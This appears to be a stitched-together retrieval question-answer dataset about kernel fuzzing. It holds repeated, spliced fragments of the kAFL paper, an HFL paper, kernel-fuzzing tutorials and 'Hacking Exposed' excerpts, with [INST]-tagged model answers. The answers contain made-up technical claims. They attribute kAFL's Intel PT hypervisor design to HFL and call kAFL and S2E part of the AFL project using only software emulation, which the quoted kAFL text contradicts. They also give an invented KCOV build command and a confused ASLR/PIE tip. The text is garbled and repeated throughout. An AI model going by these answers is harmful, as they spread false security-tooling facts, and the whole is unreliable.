al. [14] showed how to use the insight gained from modelling gray-box fuzzing as a walk on a Markov chain to increase the performance of gray-box fuzzing by up to an order of magnitude. 6.4 Coverage-Guided Kernel Fuzzers A project called syzkaller was released by Vyukov; it is the \ufb01rst publicly available gray-box coverage-guided kernel fuzzer [10]. Nossum and Casanovas demonstrate that most Linux \ufb01le system drivers are vulnerable to feedback-driven fuzzing by using an adapted version of AFL [34]. This modi\ufb01ed AFL version is based on glue code to the kernel consisting of a driver interface to USENIX Association 26th USENIX Security Symposium    179measure feedback during fuzzing \ufb01le system drivers of the kernel and expose this data to the user space. This fuzzer runs inside the targeted OS; a crash terminates the fuzzing session. In 2016, Hertz and Newsham released a modi\ufb01ed ver- sion of AFL called TriforceAFL [7]. Their work is based on a modi\ufb01cation of QEMU and utilizes the correspond- ing emulation backend to measure fuzzing progress by determining the current instruction pointer after a control \ufb02ow altering instruction has been executed. In theory, their fuzzer is able to fuzz any OS emulated in QEMU. In practice, the TriforceAFL fuzzer is limited to operating systems that are able to boot from read-only \ufb01le systems, which narrows down the candidates to classic UNIX-like operating systems such as Linux, FreeBSD, NetBSD, or OpenBSD. Therefore, TriforceAFL is currently not able to fuzz closed-source operating systems such as macOS or Windows. 7 Discussion Even though our approach is general, fast and mostly in- dependent of the underlying OS, there are some limita- tions we want to discuss in this section. OS-Speci\ufb01c Code. We use a small amount (usually less than 150 lines) of OS-dependent ring 3 code that per- forms three tasks.

I NTRODUCTION Fuzzing and symbolic execution are two representative program testing techniques for vulnerability discovery. Fuzzing generates a random input to test the target program (or kernel) in hopes that such a random input triggers a corner case exhibiting a vulnerability [ 21,46,52]. Often augmented with a coverage- guided feature, random fuzz testings such as [ 21] have been shown its effectiveness in finding vulnerabilities in a vast number of complex real-world applications. However, such random testing is limited in handling a tight branch conditionbecause generating an input to explore such a branch requires guessing a single value out of a huge search space [ 30,36,38]. On the other hand, symbolic execution takes a deterministic and complete testing approach [ 9,13], unlike fuzzing which relies on a random approach. In particular, symbolic execution takes all input to the target program as symbols and keeps track- ing the program\u2019s execution context as symbolic expressions. By interpreting an execution as a set of symbolic constraints, symbolic execution can easily handle the tight branch condition mentioned above; simply solving constraints will generate an input satisfying the branch condition. Unfortunately, symbolic execution suffers from a critical limitation, and that is state explosion. In particular, when symbolic execution faces a branch, it has to explore both sides of a branch (taken and not taken), and thereby, its search complexity grows exponentially.

As a result, the application scope of symbolic execution isnthe fuzzer as the OS needs to reboot. In this paper, we approach the problem of coverage- guided kernel fuzzing in an OS-independent and hardware-assisted way: We utilize a hypervisor and In- tel\u2019s Processor Trace (PT) technology. This allows us to remain independent of the target OS as we just re- quire a small user space component that interacts with the targeted OS. As a result, our approach introduces almost no performance overhead, even in cases where the OS crashes, and performs up to 17,000 executions per second on an off-the-shelf laptop. We developed a framework called kernel-AFL (kAFL) to assess the secu- rity of Linux, macOS, and Windows kernel components. Among many crashes, we uncovered several \ufb02aws in the ext4 driver for Linux, the HFS andAPFS \ufb01le system of macOS, and the NTFS driver of Windows. 1 Introduction Several vulnerability classes such as memory corrup- tions, race-conditional memory accesses, and use-after-free vulnerabilities, are known threats for programs run- ning in user mode as well as for the operating system (OS) core itself. Past experience has shown that attack- ers typically focus on user mode applications. This is likely because vulnerabilities in user mode programs are notoriously easier and more reliable to exploit. How- ever, with the appearance of different kinds of exploit defense mechanisms \u2013 especially in user mode, it has become much harder nowadays to exploit known vul- nerabilities. Due to those advanced defense mechanisms in user mode, the kernel has become even more appeal- ing to an attacker since most kernel defense mechanisms are not widely deployed in practice. This is due to more complex implementations, which may affect the system performance. Furthermore, some of them are not part of the of\ufb01cial mainline code base or even require sup- port for the latest CPU extension (e.g., SMAP / SMEP on x86-64). Additionally, when compromising the OS, an attacker typically gains full access to the system re-nexecuted that tries to mutate each byte individually. Once the deterministic stage is \ufb01nished, the non- deterministic phase is started. During this non- deterministic phase, multiple mutations are performed at random locations. If the deterministic phase \ufb01nds new inputs, the non-deterministic phase will be delayed un- til all deterministic phases of all interesting inputs have been performed. If an input triggers an entirely new tran- sition (as opposed to a change in the number of times the transition was taken), it will be favored and fuzzed with a higher priority. 5 Evaluation Based on our implementation, we now describe the different fuzzing campaigns we performed to evaluate kAFL. We evaluate kAFL\u2019s fuzzing performance across different platforms. Section 5.5 provides an overview of all reported vulnerabilities, crashes, and bugs that were found during the development process of kAFL. We also evaluate kAFL\u2019s ability to \ufb01nd a previously known vul- nerability. Finally, in Section 5.6 the overall fuzzing performance of kAFL is compared to ProjectTriforce ,evaluate kAFL\u2019s ability to \ufb01nd a previously known vul- nerability. Finally, in Section 5.6 the overall fuzzing performance of kAFL is compared to ProjectTriforce , the only other OS-independent feedback fuzzer avail- able. TriforceAFL is based on the emulation backend of QEMU instead of hardware-assisted virtualization and Intel PT. The performance overhead of KVM-PT is dis- cussed in Section 5.7. Additionally, a performance com- parison of our PT decoder and an Intel implementation of a software decoder is given in Section 5.8.

Fuzzing generates a random input to test the target program (or kernel) in hopes that such a random input triggers a corner case exhibiting a vulnerability [ 21,46,52]. Often augmented with a coverage- guided feature, random fuzz testings such as [ 21] have been shown its effectiveness in finding vulnerabilities in a vast number of complex real-world applications. However, such random testing is limited in handling a tight branch conditionbecause generating an input to explore such a branch requires guessing a single value out of a huge search space [ 30,36,38]. On the other hand, symbolic execution takes a deterministic and complete testing approach [ 9,13], unlike fuzzing which relies on a random approach. In particular, symbolic execution takes all input to the target program as symbols and keeps track- ing the program\u2019s execution context as symbolic expressions. By interpreting an execution as a set of symbolic constraints, symbolic execution can easily handle the tight branch condition mentioned above; simply solving constraints will generate an input satisfying the branch condition. Unfortunately, symbolic execution suffers from a critical limitation, and that is state explosion. In particular, when symbolic execution faces a branch, it has to explore both sides of a branch (taken and not taken), and thereby, its search complexity grows exponentially. As a result, the application scope of symbolic execution isnthe fuzzer as the OS needs to reboot. In this paper, we approach the problem of coverage- guided kernel fuzzing in an OS-independent and hardware-assisted way: We utilize a hypervisor and In- tel\u2019s Processor Trace (PT) technology. This allows us to remain independent of the target OS as we just re- quire a small user space component that interacts with the targeted OS. As a result, our approach introduces almost no performance overhead, even in cases where the OS crashes, and performs up to 17,000 executions per second on an off-the-shelf laptop. We developed a framework called kernel-AFL (kAFL) to assess the secu- rity of Linux, macOS, and Windows kernel components. Among many crashes, we uncovered several \ufb02aws in the ext4 driver for Linux, the HFS andAPFS \ufb01le system of macOS, and the NTFS driver of Windows. 1 Introduction Several vulnerability classes such as memory corrup- tions, race-conditional memory accesses, and use-after-free vulnerabilities, are known threats for programs run- ning in user mode as well as for the operating system (OS) core itself. Past experience has shown that attack- ers typically focus on user mode applications. This is likely because vulnerabilities in user mode programs are notoriously easier and more reliable to exploit. How- ever, with the appearance of different kinds of exploit defense mechanisms \u2013 especially in user mode, it has become much harder nowadays to exploit known vul- nerabilities. Due to those advanced defense mechanisms in user mode, the kernel has become even more appeal- ing to an attacker since most kernel defense mechanisms are not widely deployed in practice. This is due to more complex implementations, which may affect the system performance. Furthermore, some of them are not part of the of\ufb01cial mainline code base or even require sup- port for the latest CPU extension (e.g., SMAP / SMEP on x86-64). Additionally, when compromising the OS, an attacker typically gains full access to the system re-nexecuted that tries to mutate each byte individually. Once the deterministic stage is \ufb01nished, the non- deterministic phase is started. During this non- deterministic phase, multiple mutations are performed at random locations. If the deterministic phase \ufb01nds new inputs, the non-deterministic phase will be delayed un- til all deterministic phases of all interesting inputs have been performed. If an input triggers an entirely new tran- sition (as opposed to a change in the number of times the transition was taken), it will be favored and fuzzed with a higher priority. 5 Evaluation Based on our implementation, we now describe the different fuzzing campaigns we performed to evaluate kAFL. We evaluate kAFL\u2019s fuzzing performance across different platforms. Section 5.5 provides an overview of all reported vulnerabilities, crashes, and bugs that were found during the development process of kAFL. We also evaluate kAFL\u2019s ability to \ufb01nd a previously known vul- nerability. Finally, in Section 5.6 the overall fuzzing performance of kAFL is compared to ProjectTriforce ,evaluate kAFL\u2019s ability to \ufb01nd a previously known vul- nerability. Finally, in Section 5.6 the overall fuzzing performance of kAFL is compared to ProjectTriforce , the only other OS-independent feedback fuzzer avail- able. TriforceAFL is based on the emulation backend of QEMU instead of hardware-assisted virtualization and Intel PT. The performance overhead of KVM-PT is dis- cussed in Section 5.7. Additionally, a performance com- parison of our PT decoder and an Intel implementation of a software decoder is given in Section 5.8. If not stated otherwise, the benchmarks were per- formed on a desktop system with an Intel i7-6700 pro- cessor and 32GB DDR4 RAM. To avoid distortions due 174    26th USENIX Security Symposium USENIX Associationto poor I/O performance, all benchmarks are performed on a RAM disk. Similar to AFL, we consider a crash- ing input to be unique if it triggered at least one basicn\"                   Question: 'What is the difference between HFL and kAFL/S2E?[/INST] HFL and kAFL/S2E are two different fuzzing frameworks used for vulnerability discovery, but they have some key differences.\n\nHFL stands for HyperFuzz Linux Kernel Fuzzer, which is an OS-independent and hardware-assisted kernel fuzzer. It utilizes a hypervisor and Intel's Processor Trace (PT) technology to achieve high coverage and fast vulnerability discovery. HFL is designed to work specifically with Linux kernels and focuses on exploring the kernel's behavior in detail.\n\nOn the other hand, kAFL (kernel-AFL) and S2E (Symbolic Execution Engine) are part of the American Fuzzy Lop (AFL) project. While AFL is primarily focused on user-mode applications, kAFL and S2E extend AFL's capabilities to kernel fuzzing. They do not rely on hardware assistance like HFL but instead use software emulation and symbolic execution to explore kernel behavior.\n\nThe primary differences between HFL and kAFL/S2E include:\n\n1. Hardware Assistance: HFL uses hardware assistance through a hypervisor and Intel PT, while kAFL and S2E rely solely on software emulation.\n2. Coverage: HFL achieves higher code coverage than kAFL and S2E, making it more effective in discovering vulnerabilities.\n3. Performance: HFL introduces almost no performance overhead, while kAFL and S2E may have higher performance overhead due to their software-based approach.\n4. Vulnerability Discovery: HFL has been shown to find vulnerabilities more quickly than kAFL and S2E, particularly in the Linux kernel.\n5. Platform Support: HFL is specifically designed for Linux kernel fuzzing, while kAFL and S2E support fuzzing various operating systems, including Linux, macOS, and Windows."}

The acronym HFL itself suggests that it is a hybrid approach, meaning it combines multiple methods to enhance the effectiveness of fuzz testing.\n\nIn this context, the authors of the research paper, including Kyungtae Kim, Dae R. Jeong, Chung Hwan Kim, Yeongjin Jang, Insik Shin, and Byoungyoung Lee from Purdue University, KAIST, NEC Laboratories America, and Oregon State University, have developed a hybrid fuzzer that utilizes both mutation-based and data-driven fuzzing strategies.

Introduced in Linux v5.1, an integer underflow bug in **fs/fs_context.c** allowed for a heap buffer overflow, which could allow any authenticated user to completely compromise the system.  ## Introduction  Ive been playing CTFs with my team for a few years, and weve become increasingly interested in kernel exploits - both when solving and creating our own challenges. Some members of my team have even developed a novel exploitation technique that has since become common in real-life kernel exploits. We decided to apply our knowledge to discovering and exploiting a bug in the modern Linux kernel.  This article assumes a working knowledge of kernel fundamentals, but key concepts will be explained along the way.  ## Discovery  Finding vulnerabilities is often compared to finding a needle in a haystack. Meaning it is much more time-consuming than mentally challenging. So like most researchers, we opted to let the computer sift through the haystack by running a fuzzer that sends programs unexpected data and records all crashes. A kernel should never crash, and when it does, its a good potential lead for a place that might be exploitable.  As we were looking for a kernel bug we opted to use Googles coverage-based kernel fuzzer, **Syzkaller**. This program allows distributed nodes to fuzz the Linux kernel with random syscalls, attempting to reach as much kernelspace code as possible. If a set of input causes the kernel to crash (or if an incorrect address is detected), Syzkaller will begin diverting resources to reproducing the crash - creating a program that can be reliably run to cause the crash.  After just a few days of fuzzing, we received a KASAN (kernel address validator) violation:\"npare kAFL against Oracle\u2019s \ufb01le system fuzzer [34] due to technical issues with its setup. During each run, we fuzzed the JSON parser for 30 minutes. The averaged and rounded results are displayed in Table 1. As we can see, the performance of kAFL is very similar across different systems. It should be re- marked that the variance in this experiment is rather high 11http://zserge.com/jsmn.html 176    26th USENIX Security Symposium USENIX AssociationExecs/Sec (1 Process)Execs/Sec (8 Processes)Time to Crash (1 Process)Time to Crash (8 Processes)Paths/Min (1 Process)Paths/Min (8 Processes) TriforceAFL 150 320 -a-a10.08 -b Linux (initramfs) 3000 5700 7:50 6:00 15.84 15.62 Debian 8 3000 5700 4:55 6:30 16.20 16.00 Debian 8 (KASan) 4300 5700 9:20 6:00 16.22 15.90 macOS (10.12.4) 5100 8100 7:43 5:10 14.50 15.06 Windows 10 4300 8700 4:14 4:50 11.50 12.02 aNot found during 30-minute experiments. bThis value cannot be obtained since TriforceAFL does not synchronize in such short time frames.

This is due to the stochastic nature of fuzzing, since each fuzzer \ufb01nds vastly different paths, some of which may take signi\ufb01- cantly longer to process, especially crashing paths and loops.

TriforceAFL We used the JSON driver to compare kAFL and TriforceAFL with respect to execution speed and code coverage. However, the results where biased heavily in two ways: TriforceAFL did not manage to \ufb01nd a path that triggers the crash within 30 minutes (usually it takes approximately 2 hours), making it very hard ton"# Detecting bugs  Now, lets figure out a better way to detect kernel bugs than waiting for a kernel panic.

This program allows distributed nodes to fuzz the Linux kernel with random syscalls, attempting to reach as much kernelspace code as possible. If a set of input causes the kernel to crash (or if an incorrect address is detected), Syzkaller will begin diverting resources to reproducing the crash - creating a program that can be reliably run to cause the crash.  After just a few days of fuzzing, we received a KASAN (kernel address validator) violation:\"npare kAFL against Oracle\u2019s \ufb01le system fuzzer [34] due to technical issues with its setup. During each run, we fuzzed the JSON parser for 30 minutes. The averaged and rounded results are displayed in Table 1. As we can see, the performance of kAFL is very similar across different systems. It should be re- marked that the variance in this experiment is rather high 11http://zserge.com/jsmn.html 176    26th USENIX Security Symposium USENIX AssociationExecs/Sec (1 Process)Execs/Sec (8 Processes)Time to Crash (1 Process)Time to Crash (8 Processes)Paths/Min (1 Process)Paths/Min (8 Processes) TriforceAFL 150 320 -a-a10.08 -b Linux (initramfs) 3000 5700 7:50 6:00 15.84 15.62 Debian 8 3000 5700 4:55 6:30 16.20 16.00 Debian 8 (KASan) 4300 5700 9:20 6:00 16.22 15.90 macOS (10.12.4) 5100 8100 7:43 5:10 14.50 15.06 Windows 10 4300 8700 4:14 4:50 11.50 12.02 aNot found during 30-minute experiments. bThis value cannot be obtained since TriforceAFL does not synchronize in such short time frames. Table 1: kAFL and TriforceAFL fuzzing performance on the JSON sample driver. Figure 6: Coverage comparison of kAFL (initramfs) and TriforceAFL. kAFL takes less than 3 minutes to \ufb01nd the same number of paths as TriforceAFL does in 30 minutes (each running 1 process). and explains some of the surprising results. This is due to the stochastic nature of fuzzing, since each fuzzer \ufb01nds vastly different paths, some of which may take signi\ufb01- cantly longer to process, especially crashing paths and loops. One example for high variance is the fact that on Debian 8 (initramfs), the multiprocessing con\ufb01guration on average needed more time to \ufb01nd the crash than one process. TriforceAFL We used the JSON driver to compare kAFL and TriforceAFL with respect to execution speed and code coverage. However, the results where biased heavily in two ways: TriforceAFL did not manage to \ufb01nd a path that triggers the crash within 30 minutes (usually it takes approximately 2 hours), making it very hard ton"# Detecting bugs  Now, lets figure out a better way to detect kernel bugs than waiting for a kernel panic.  A panic works poorly as a bug indicator. First, some bugs dont cause it (e.g. the above-mentioned info-leaks). Second, in case of a memory corruption, kernel panic might occur much later than the corruption itself. In this case, its hard to localize the bug: its unclear which of the recent fuzzer actions has caused it.  To solve these problems, dynamic bug detectors have been invented. The word \"dynamic\" means that these detectors work while the program is running. They analyze its actions based on their algorithm and report an abnormal situation when its detected.  There are a few dynamic bug detectors for the Linux kernel. The most notable one is KASAN. Its notable not because I worked on it, but because it detects the main types of memory corruptions: out-of-bounds and use-after-free accesses. To use KASAN, enable the `CONFIG_KASAN` option and rebuild the kernel. KASAN will be running in the background and report identified bugs to the kernel log.  #### info  Learn more about dynamic bug detectors for the Linux kernel from the Mentorship Session: Dynamic Program Analysis for Fun and Profit talk by Dmitry Vyukov (slides).  ### Automating  There are plenty of things that can be automated when it comes to fuzzing, including:    * monitoring kernel logs for crashes and reports of dynamic detectors;    * restarting virtual machines with crashed kernels;    * trying to reproduce crashes by rerunning the last few inputs that were executed right before the crash; and    * reporting found bugs to kernel developers.   How to implement all these functions? Write the code and add it to your fuzzer. A purely engineering task.  ### All together  Lets put together the three ideas discussed above - coverage-guided fuzzing, dynamic detectors, and automation - and incorporate them into the fuzzer. The overall picture becomes as follows.ncd linux     ./scripts/config          -e KCOV          -d KCOV_INSTRUMENT_ALL       KCOV is capable of recording code coverage from the whole kernel. It can be set with KCOV_INSTRUMENT_ALL option. This has disadvantages though - it would slow down the parts of the kernel we dont want to profile, and would introduce noise in our measurements (reduce \"stability\"). For starters, lets disable KCOV_INSTRUMENT_ALL and enable KCOV selectively on the code we actually want to profile. Today, we focus on netlink machinery, so lets enable KCOV on whole \"net\" directory tree:                find net -name Makefile | xargs -L1 -I {                   Question: 'What is important to compile a KCOV and KASAN enabled kernel with?[/INST] To compile a kernel with KCOV and KASAN enabled, you need to follow these steps:\n\n1. Navigate to the Linux kernel source directory using the command `cd linux`.\n2. Configure the kernel with the desired options. To enable KCOV selectively on the \"net\" directory tree, use the following commands:  ```  ./scripts/config  -e KCOV  -d KCOV_INSTRUMENT_ALL  find net -name Makefile | xargs -L1 -I {} sh -c \"make -C {} olddefconfig KCOV=y\"  ```  This command enables KCOV for the \"net\" directory tree without slowing down the entire kernel or introducing excessive noise.\n\n3. Enable KASAN by adding the `CONFIG_KASAN` option to the configuration file and rebuilding the kernel.  ```  ./scripts/config  -e CONFIG_KASAN  make -j <number_of_processors>  ```\n\nAfter completing these steps, you will have a kernel compiled with KCOV and KASAN enabled, allowing for coverage-guided fuzzing and dynamic detection of memory corruptions."}

Enabling KCOV with the `KCOV_INSTRUMENT_ALL` option can help profile the entire kernel but comes with disadvantages such as performance degradation and increased noise in measurements. Instead, enabling KCOV selectively on specific directories or files is recommended.\n\nTo increase the likelihood of reporting memory corruption bugs using KCOV, you could consider adding support for Address Space Layout Randomization (ASLR) and stack smashing protection (PIE - Position Independent Code). These features can make it harder for attackers to exploit memory corruption vulnerabilities by randomizing the memory layout and making it more difficult to predict the location of critical data.\n\nTo enable ASLR and PIE for specific modules or drivers, you may need to modify their build configurations. This typically involves setting certain compiler flags or configuration options when building the module or driver. For example, you might add the following flags to your Makefile:\n\n```makefile\nobjmktag = -fPIC -fPIE\n```\n\nKeep in mind that enabling ASLR and PIE may have performance implications and may require additional resources. Additionally, some older or legacy software may not be compatible with these features. Always test thoroughly before deploying in production environments."}
{"query": "How do we feed KCOV into AFL?", "Context": "Seph 12 Dec 2014  # Bug hunting with American Fuzzy Lop  I read about American Fuzzy Lop (AFL) the other day, and wanted to try it. For the non-technical, fuzzers are testing tools for finding obscure bugs. They work by effectively sitting a million monkeys at keyboards pressing buttons in your program, to see if it crashes or hangs. AFL is a little different than normal fuzzers because it uses flow analysis to make particularly diabolical input data. It does this by instrumenting your (C/C++) program during compilation.  As an excuse to mess around with it, I pulled out a little library I wrote a few years ago called librope. Librope implements a rope data structure (wikipedia), which is a more complex version of a string (har har). If you use an array to store a string, inserting or deleting characters in the middle of the string is a O(n) operation, whereas if you use a tree, inserts and deletes are O(log n). The extra complexity of the data type starts paying off when youre making inline edits on a string thats more than a kilobyte or so.  The API is pretty simple:                rope *r = rope_new();       // Insert \"Hi there!\" at unicode position 0     rope_insert(r, 0, \"Hi there!\");       // Delete 6 characters at unicode position 2     rope_delete(r, 2, 6);         Theres some more functions, but those are the only functions that Im going to test for now.  Fuzzers are famous for finding bugs and security holes in software, but librope is pretty small and very well tested, so I went in pretty confident that I wouldnt find any new surprises.  ## Wrapping librope for AFL  AFL is designed for tools like libpng, which take a file as an input. To test these C functions, well need to make a simple way to call them from stdin. So the next step is making a simple file format. The test harness will read the file and call `rope_insert` and `rope_delete` based on the contents of the file.nseeds involved, the edge coverage at the starting point is much higher than other fuzzers with only one initial seed.

Most importantly:    * syzkaller (aka syzbot) by Dmitry Vyukov, is a very powerful CI-style continuously running kernel fuzzer, which found hundreds of issues already. Its an awesome machine - it will even report the bugs automatically!   * Trinity fuzzer  Well use the AFL, everyones favorite fuzzer. AFL was written by Micha\u0142 Zalewski. Its well known for its ease of use, speed and very good mutation logic. Its a perfect choice for people starting their journey into fuzzing!  If you want to read more about AFL, the documentation is in couple of files:    * Historical notes   * Technical whitepaper   * README  ## Coverage-guided fuzzing  Coverage-guided fuzzing works on the principle of a feedback loop:    * the fuzzer picks the most promising test case   * the fuzzer mutates the test into a large number of new test cases   * the target code runs the mutated test cases, and reports back code coverage   * the fuzzer computes a score from the reported coverage, and uses it to prioritize the interesting mutated tests and remove the redundant onesnand Symposium on the Foundations of Software Engineering , ser.

All of this running inside KVM virtualization.  This blog post is a tutorial. With the easy to follow instructions, you should be able to quickly replicate the results. All you need is a machine running Linux and 20 minutes.  ## Prior work  The technique we are going to use is formally called \"coverage-guided fuzzing\". Theres a lot of prior literature:    * The Smart Fuzzer Revolution by Dan Guido, and LWN article about it   * Effective file format fuzzing by Mateusz \u201cj00ru\u201d Jurczyk   * honggfuzz by Robert Swiecki, is a modern, feature-rich coverage-guided fuzzer   * ClusterFuzz   * Fuzzer Test Suite  Many people have fuzzed the Linux Kernel in the past. Most importantly:    * syzkaller (aka syzbot) by Dmitry Vyukov, is a very powerful CI-style continuously running kernel fuzzer, which found hundreds of issues already. Its an awesome machine - it will even report the bugs automatically!   * Trinity fuzzer  Well use the AFL, everyones favorite fuzzer. AFL was written by Micha\u0142 Zalewski. Its well known for its ease of use, speed and very good mutation logic. Its a perfect choice for people starting their journey into fuzzing!  If you want to read more about AFL, the documentation is in couple of files:    * Historical notes   * Technical whitepaper   * README  ## Coverage-guided fuzzing  Coverage-guided fuzzing works on the principle of a feedback loop:    * the fuzzer picks the most promising test case   * the fuzzer mutates the test into a large number of new test cases   * the target code runs the mutated test cases, and reports back code coverage   * the fuzzer computes a score from the reported coverage, and uses it to prioritize the interesting mutated tests and remove the redundant onesnand Symposium on the Foundations of Software Engineering , ser.

Proudly published with Ghost\"nKCOV reports data into a ring buffer. Setting it up is pretty simple, see our code. Then you can enable and disable it with a trivial ioctl:                ioctl(kcov_fd, KCOV_ENABLE, KCOV_TRACE_PC);     /* profiled code */     ioctl(kcov_fd, KCOV_DISABLE, 0);       After this sequence the ring buffer contains the list of %rip values of all the basic blocks of the KCOV-enabled kernel code. To read the buffer just run:                n = __atomic_load_n(&kcov_ring[0], __ATOMIC_RELAXED);     for (i = 0; i < n; i++) {         printf(\"0x%lx \", kcov_ring[i + 1]);                        Question: 'How do we feed KCOV into AFL?[/INST] To feed KCOV data into AFL, you would first need to modify the AFL test harness to read the KCOV ring buffer instead of using standard input. Here's a high-level overview of how you could accomplish this:\n\n1. Modify the AFL test harness to open the KCOV device file and read data from it instead of reading from standard input.\n2. Instrument the AFL test harness to send the read data to the target under test (your kernel module) using the appropriate interface.\n3. Modify the target under test to handle the incoming data and perform the necessary actions based on the received data.\n4. Use the KCOV data to guide the fuzzing process by providing the fuzzer with coverage information to help prioritize test cases.\n\nKeep in mind that implementing this solution requires a deep understanding of both the AFL and KCOV systems, as well as the specifics of your target under test. Additionally, this approach may introduce additional complexity and potential compatibility issues.\n\nAn alternative approach would be to use a tool like gcov or lcov to generate coverage information for your kernel module and feed that data to AFL instead of directly integrating KCOV with AFL. This method might be simpler and less error-prone, but it may not provide the same level of granularity and accuracy as using KCOV directly."}

Among the various dynamic analysis techniques, fuzzing has been highly popular since its invention and a multitude of fuzzing tools of varying sophistication have been developed. It can be enormously fun to take the latest fuzzing tool and see just how many ways you can crash your favorite application. But what if you are a developer of a large project which does not lend itself to being fuzzed easily? How should you approach dynamic analysis in this case?  ### 1. Decide your goalsnfuzzing can be applied. B\u00f6hme et al. [14] showed how to use the insight gained from modelling gray-box fuzzing as a walk on a Markov chain to increase the performance of gray-box fuzzing by up to an order of magnitude. 6.4 Coverage-Guided Kernel Fuzzers A project called syzkaller was released by Vyukov; it is the \ufb01rst publicly available gray-box coverage-guided kernel fuzzer [10]. Nossum and Casanovas demonstrate that most Linux \ufb01le system drivers are vulnerable to feedback-driven fuzzing by using an adapted version of AFL [34]. This modi\ufb01ed AFL version is based on glue code to the kernel consisting of a driver interface to USENIX Association 26th USENIX Security Symposium    179measure feedback during fuzzing \ufb01le system drivers of the kernel and expose this data to the user space. This fuzzer runs inside the targeted OS; a crash terminates the fuzzing session. In 2016, Hertz and Newsham released a modi\ufb01ed ver- sion of AFL called TriforceAFL [7]. Their work is based on a modi\ufb01cation of QEMU and utilizes the correspond- ing emulation backend to measure fuzzing progress by determining the current instruction pointer after a control \ufb02ow altering instruction has been executed. In theory, their fuzzer is able to fuzz any OS emulated in QEMU. In practice, the TriforceAFL fuzzer is limited to operating systems that are able to boot from read-only \ufb01le systems, which narrows down the candidates to classic UNIX-like operating systems such as Linux, FreeBSD, NetBSD, or OpenBSD. Therefore, TriforceAFL is currently not able to fuzz closed-source operating systems such as macOS or Windows. 7 Discussion Even though our approach is general, fast and mostly in- dependent of the underlying OS, there are some limita- tions we want to discuss in this section. OS-Speci\ufb01c Code. We use a small amount (usually less than 150 lines) of OS-dependent ring 3 code that per- forms three tasks. First, it interacts with the OS to trans- late the inputs from the fuzzing engine to interactionsnNow it is time to consider how this workstation will interact withthe outside world.The r ServicesJust what services do you need to run? For example, are you going to allow the use of rservices? These are rlogin and rsh, primarily. These services are notorious for sportingsecurity holes, not just in the distant past, but throughout their history. For example, inAugust 1996, an advisory was issued regarding an rlogin hole in certain distributions ofLinux. The hole was both a Class A and Class B security hole, allowing both local andremote users to gain leveraged access:A vulnerability exists in the rlogin program of NetKitB-0.6 This vulnerability affects severalwidely used Linux distributions, including Red Hat Linux 2.0, 2.1 and derived systems includingCaldera Network Desktop, Slackware 3.0 and others. This vulnerability is not limited to Linux orany other free UNIX systems. Both the information about this vulnerability and methods of itsexploit were made available on thenGiven the rightsecurity infrastructure, these types of attacks are easily traced, and the attacker iseasily identified.Three common types of local denial of service attacks are process degradation,disk space exhaustion, and index node (inode) exhaustion.Process DegradationOne local denial of service is the degrading of processes.This occurs when theattacker reduces performance by overloading the target system, by eitherspawning multiple processes to eat up all available resources of the host system, byspawning enough processes to fill to capacity the system process table, or byspawning enough processes to overload the central processing unit (CPU).An example of this type of attack is exhibited through a recent vulnerabilitydiscovered in the Linux kernel. By creating a system of deep symbolic links, auser can prevent the scheduling of other processes when an attempt to derefer-ence the symbolic link is made.nThis flaw isrelated to POSIX \u201ccapabilities\u201d that were recently implemented in the Linux kernel.Chapter 8: Hacking UNIX 351x0c352 Hacking Exposed: Network Security Secrets and SolutionsThese capabilities were designed to enable more control over what privileged processescan do. Essentially, these capabilities were designed to enhance the security of the overallsystem. Unfortunately, due to a programming flaw, the functionality of this securitymeasure does not work as intended. This flaw can be exploited by fooling SUID pro-grams (for example, sendmail) into not dropping privileges when they should. Thus,attackers who have shell access to a vulnerable system could escalate their privilege toroot.U Kernel Flaws CountermeasureThis vulnerability affects many Linux systems and is something that any Linux adminis-trator should patch immediately. Luckily, the fix is fairly straightforward. For 2.2.x kernelusers, simply upgrade the kernel to version 2.2.16 or higher.] System MisconfigurationWen", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

Bitscope is a bit-level debugger and reverse engineering tool. S2E (Semantics-Based Execution Environment) is an environment for dynamic symbolic execution, which operates at the instruction execution level. SAGE (Scalable Automated Generalized Explorer) is a whitebox fuzzing framework that uses static and dynamic analysis techniques, including concolic testing and SMT solvers, to find vulnerabilities in software.

Another approach is to use the same kind of information to bias the search towards dangerous behavior instead of new code paths [26]. The downside is that these techniques are often signif- icantly harder to implement, scale to large programs, and parallelize.

Similar techniques are used by many other fuzzers [8, 25]. To further increase the effectiveness of gray-box fuzzing, many of the tricks already used in black-box fuzzing can be applied.

Symbolic execution involves executing a program symbolically, meaning that variables are treated as symbols rather than specific values. This allows the tool to explore different possible input values and paths through the program. Constraint solving is then used to find solutions to the symbolic equations that represent the program's state and input values. By combining these techniques, SAGE is able to discover complex paths that may not be reached by random inputs alone. However, implementing and scaling these techniques to large programs and parallelizing them is challenging. To the best of my knowledge, there are no such tools specifically designed for operating system fuzzing that use these techniques."}
